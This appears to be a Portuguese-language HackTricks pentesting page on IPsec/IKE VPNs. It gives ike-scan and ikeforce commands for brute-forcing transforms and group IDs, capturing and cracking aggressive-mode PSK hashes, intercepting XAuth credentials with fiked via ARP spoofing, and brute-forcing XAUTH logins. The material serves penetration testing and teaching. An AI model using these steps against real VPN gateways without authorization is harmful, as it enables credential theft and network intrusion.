# 500/udp - Pentesting IPsec/IKE VPN

{{#include ../banners/hacktricks-training.md}}

## Informações Básicas

**IPsec** é amplamente reconhecido como a principal tecnologia para proteger comunicações entre redes (LAN-to-LAN) e de usuários remotos para o gateway da rede (acesso remoto), servindo como a espinha dorsal para soluções de VPN corporativas.

O estabelecimento de uma **associação de segurança (SA)** entre dois pontos é gerenciado pelo **IKE**, que opera sob a égide do ISAKMP, um protocolo projetado para autenticação e troca de chaves. Este processo se desenrola em várias fases:

- **Fase 1:** Um canal seguro é criado entre dois pontos finais. Isso é alcançado através do uso de uma Chave Pré-Compartilhada (PSK) ou certificados, empregando o modo principal, que envolve três pares de mensagens, ou **modo agressivo**.
- **Fase 1.5:** Embora não seja obrigatório, esta fase, conhecida como Fase de Autenticação Estendida, verifica a identidade do usuário que tenta se conectar, exigindo um nome de usuário e senha.
- **Fase 2:** Esta fase é dedicada à negociação dos parâmetros para proteger dados com **ESP** e **AH**. Permite o uso de algoritmos diferentes dos da Fase 1 para garantir **Perfeita Confidencialidade Futuro (PFS)**, aumentando a segurança.

**Porta padrão:** 500/udp

## **Descubra** o serviço usando nmap
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **Encontrando uma transformação válida**

A configuração do IPSec pode ser preparada apenas para aceitar uma ou algumas transformações. Uma transformação é uma combinação de valores. **Cada transformação** contém um número de atributos como DES ou 3DES como o **algoritmo de criptografia**, SHA ou MD5 como o **algoritmo de integridade**, uma chave pré-compartilhada como o **tipo de autenticação**, Diffie-Hellman 1 ou 2 como o **algoritmo de distribuição de chaves** e 28800 segundos como a **vida útil**.

Então, a primeira coisa que você deve fazer é **encontrar uma transformação válida**, para que o servidor possa se comunicar com você. Para isso, você pode usar a ferramenta **ike-scan**. Por padrão, o Ike-scan funciona no modo principal e envia um pacote para o gateway com um cabeçalho ISAKMP e uma única proposta com **oito transformações dentro dela**.

Dependendo da resposta, você pode obter algumas informações sobre o endpoint:
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
Como você pode ver na resposta anterior, há um campo chamado **AUTH** com o valor **PSK**. Isso significa que o vpn está configurado usando uma chave pré-compartilhada (e isso é realmente bom para um pentester).\
**O valor da última linha também é muito importante:**

- _0 returned handshake; 0 returned notify:_ Isso significa que o alvo **não é um gateway IPsec**.
- _**1 returned handshake; 0 returned notify:**_ Isso significa que o **alvo está configurado para IPsec e está disposto a realizar a negociação IKE, e uma ou mais das transformações que você propôs são aceitáveis** (uma transformação válida será mostrada na saída).
- _0 returned handshake; 1 returned notify:_ Os gateways VPN respondem com uma mensagem de notificação quando **nenhuma das transformações é aceitável** (embora alguns gateways não o façam, caso em que uma análise adicional e uma proposta revisada devem ser tentadas).

Então, neste caso, já temos uma transformação válida, mas se você estiver no 3º caso, então você precisa **forçar um pouco para encontrar uma transformação válida:**

Primeiro de tudo, você precisa criar todas as transformações possíveis:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
E então faça brute-force em cada um usando ike-scan (isso pode levar vários minutos):
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
Se o brute-force não funcionou, talvez o servidor esteja respondendo sem handshakes mesmo para transformações válidas. Então, você poderia tentar o mesmo brute-force, mas usando o modo agressivo:
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
Espero que **uma transformação válida seja retornada**.\
Você pode tentar o **mesmo ataque** usando [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py).\
Você também pode tentar forçar transformações com [**ikeforce**](https://github.com/SpiderLabs/ikeforce):
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../images/image (617).png>)

Em **DH Group: 14 = 2048-bit MODP** e **15 = 3072-bit**\
**2 = HMAC-SHA = SHA1 (neste caso). O formato `--trans` é $Enc,$Hash,$Auth,$DH**

A Cisco indica evitar o uso dos grupos DH 1 e 2 porque eles não são fortes o suficiente. Especialistas acreditam que **países com muitos recursos podem facilmente quebrar a criptografia** de dados que usam esses grupos fracos. Isso é feito usando um método especial que os prepara para decifrar os códigos rapidamente. Embora custe muito dinheiro configurar esse método, ele permite que esses países poderosos leiam os dados criptografados em tempo real se estiverem usando um grupo que não é forte (como 1.024 bits ou menor).

### Fingerprinting de servidor

Então, você pode usar ike-scan para tentar **descobrir o fornecedor** do dispositivo. A ferramenta envia uma proposta inicial e para de reproduzir. Em seguida, ela **analisa** a **diferença** de **tempo** **entre** as **mensagens** recebidas do servidor e o padrão de resposta correspondente, o pentester pode identificar com sucesso o fornecedor do gateway VPN. Além disso, alguns servidores VPN usarão a **carga útil opcional de Vendor ID (VID)** com IKE.

**Especifique a transformação válida, se necessário** (usando --trans)

Se o IKE descobrir qual é o fornecedor, ele imprimirá:
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
Isso também pode ser alcançado com o script nmap _**ike-version**_

## Encontrando o ID correto (nome do grupo)

Para ser permitido capturar o hash, você precisa de uma transformação válida que suporte o modo agressivo e o ID correto (nome do grupo). Provavelmente, você não saberá o nome do grupo válido, então terá que forçá-lo.\
Para isso, eu recomendaria 2 métodos:

### Forçando ID com ike-scan

Primeiramente, tente fazer uma solicitação com um ID falso tentando coletar o hash ("-P"):
```bash
ike-scan -P -M -A -n fakeID <IP>
```
Se **nenhum hash for retornado**, então provavelmente este método de força bruta funcionará. **Se algum hash for retornado, isso significa que um hash falso será enviado de volta para um ID falso, então este método não será confiável** para forçar o ID. Por exemplo, um hash falso pode ser retornado (isso acontece em versões modernas):

![](<../images/image (917).png>)

Mas se, como eu disse, nenhum hash for retornado, então você deve tentar forçar nomes de grupos comuns usando ike-scan.

Este script **tentará forçar possíveis IDs** e retornará os IDs onde um handshake válido é retornado (este será um nome de grupo válido).

Se você descobriu uma transformação específica, adicione-a no comando ike-scan. E se você descobriu várias transformações, sinta-se à vontade para adicionar um novo loop para tentar todas elas (você deve tentar todas até que uma delas funcione corretamente).

Você pode usar o[dicionário do ikeforce](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) ou [o que está no seclists](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) de nomes de grupos comuns para forçá-los:
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
{{#file}}
vpnIDs.txt
{{#endfile}}

### Bruteforçando ID com Iker

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) também usa **ike-scan** para bruteforçar possíveis nomes de grupos. Ele segue seu próprio método para **encontrar um ID válido com base na saída do ike-scan**.

### Bruteforçando ID com ikeforce

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce) é uma ferramenta que pode ser usada para **bruteforçar IDs também**. Esta ferramenta irá **tentar explorar diferentes vulnerabilidades** que poderiam ser usadas para **distinguir entre um ID válido e um não válido** (pode ter falsos positivos e falsos negativos, por isso prefiro usar o método ike-scan se possível).

Por padrão, **ikeforce** enviará no início alguns IDs aleatórios para verificar o comportamento do servidor e determinar a tática a ser usada.

- O **primeiro método** é bruteforçar os nomes dos grupos **procurando** pela informação **Dead Peer Detection DPD** de sistemas Cisco (essa informação é apenas respondida pelo servidor se o nome do grupo estiver correto).
- O **segundo método** disponível é **verificar o número de respostas enviadas a cada tentativa** porque às vezes mais pacotes são enviados quando o ID correto é usado.
- O **terceiro método** consiste em **procurar por "INVALID-ID-INFORMATION" em resposta a ID incorreto**.
- Finalmente, se o servidor não responder nada às verificações, **ikeforce** tentará bruteforçar o servidor e verificar se, quando o ID correto é enviado, o servidor responde com algum pacote.\
Obviamente, o objetivo de bruteforçar o ID é obter o **PSK** quando você tiver um ID válido. Então, com o **ID** e o **PSK** você terá que bruteforçar o XAUTH (se estiver habilitado).

Se você descobriu uma transformação específica, adicione-a no comando ikeforce. E se você descobriu várias transformações, sinta-se à vontade para adicionar um novo loop para tentar todas (você deve tentar todas até que uma delas funcione corretamente).
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### Sniffing ID

(Do livro **Network Security Assessment: Know Your Network**): Também é possível obter nomes de usuário válidos ao capturar a conexão entre o cliente VPN e o servidor, já que o primeiro pacote do modo agressivo contendo o ID do cliente é enviado em texto claro.

![](<../images/image (891).png>)

## Capturando & quebrando o hash

Finalmente, se você encontrou uma **transformação válida** e o **nome do grupo** e se o **modo agressivo é permitido**, então você pode facilmente capturar o hash quebrável:
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
O hash será salvo dentro de _hash.txt_.

Você pode usar **psk-crack**, **john** (usando [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py)) e **hashcat** para **crack** o hash:
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**O modo agressivo IKE** combinado com uma **Chave Pré-Compartilhada (PSK)** é comumente empregado para fins de **autenticação em grupo**. Este método é aumentado por **XAuth (Autenticação Estendida)**, que serve para introduzir uma camada adicional de **autenticação de usuário**. Tal autenticação normalmente utiliza serviços como **Microsoft Active Directory**, **RADIUS** ou sistemas comparáveis.

Ao transitar para **IKEv2**, uma mudança notável é observada onde **EAP (Protocolo de Autenticação Extensível)** é utilizado em vez de **XAuth** para o propósito de autenticar usuários. Esta mudança destaca uma evolução nas práticas de autenticação dentro de protocolos de comunicação segura.

### Captura de credenciais em MitM de rede local

Assim, você pode capturar os dados do login usando _fiked_ e ver se há algum nome de usuário padrão (Você precisa redirecionar o tráfego IKE para `fiked` para sniffing, o que pode ser feito com a ajuda de spoofing ARP, [mais informações](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). Fiked atuará como um ponto final de VPN e capturará as credenciais XAuth:
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
Além disso, usando IPSec, tente realizar um ataque MitM e bloquear todo o tráfego para a porta 500; se o túnel IPSec não puder ser estabelecido, talvez o tráfego seja enviado em claro.

### Forçando a senha e o nome de usuário XAUTH com ikeforce

Para forçar a senha do **XAUTH** (quando você conhece um nome de grupo **id** válido e o **psk**), você pode usar um nome de usuário ou uma lista de nomes de usuário e uma lista de senhas:
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
Dessa forma, ikeforce tentará se conectar usando cada combinação de nome de usuário:senha.

Se você encontrar uma ou várias transformações válidas, basta usá-las como nos passos anteriores.

## Autenticação com um VPN IPSEC

No Kali, **VPNC** é utilizado para estabelecer túneis IPsec. Os **perfis** devem estar localizados no diretório `/etc/vpnc/`. Você pode iniciar esses perfis usando o comando _**vpnc**_.

Os seguintes comandos e configurações ilustram o processo de configuração de uma conexão VPN com VPNC:
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
Neste setup:

- Substitua `[VPN_GATEWAY_IP]` pelo endereço IP real do gateway VPN.
- Substitua `[VPN_CONNECTION_ID]` pelo identificador da conexão VPN.
- Substitua `[VPN_GROUP_SECRET]` pelo segredo do grupo da VPN.
- Substitua `[VPN_USERNAME]` e `[VPN_PASSWORD]` pelas credenciais de autenticação da VPN.
- `[PID]` simboliza o ID do processo que será atribuído quando `vpnc` for iniciado.

Certifique-se de que valores reais e seguros sejam usados para substituir os espaços reservados ao configurar a VPN.

## Material de Referência

- [PSK cracking paper](http://www.ernw.de/download/pskattack.pdf)
- [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
- [Scanning a VPN Implementation](http://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf)
- Network Security Assessment 3rd Edition

## Shodan

- `port:500 IKE`

{{#include ../banners/hacktricks-training.md}}
